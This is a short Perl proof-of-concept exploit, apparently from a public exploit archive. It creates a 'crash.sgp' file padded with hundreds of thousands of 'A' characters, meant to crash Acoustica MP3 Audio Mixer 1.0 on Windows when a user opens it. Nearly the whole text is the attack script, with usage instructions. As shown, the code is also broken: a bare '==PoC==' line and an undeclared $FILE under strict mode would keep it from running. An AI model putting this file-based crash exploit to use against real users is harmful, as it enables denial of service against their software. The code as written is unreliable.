#!/usr/bin/perl -w
#
# Acoustica MP3 Audio Mixer 1.0 (.sgp file) Crash Vulnerability Exploit
#
# Founded and exploited by prodigy
#
# Contact: smack_the_stream@hotmail.com
#
# Vendor: www.acoustica.com
#
# Usage to reproduce the bug: when you created the malicious file, open it from the menu of the program and booom!!
#
# Platform: Windows
#
###################################################################
 
==PoC==
 
use strict;
 
use diagnostics;
 
my $file= "crash.sgp";
 
my $boom= "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" x 5000;
 
open($FILE,">>$file");
 
print $FILE "$boom";
 
close($FILE);
 
print "File Created successfully\n";
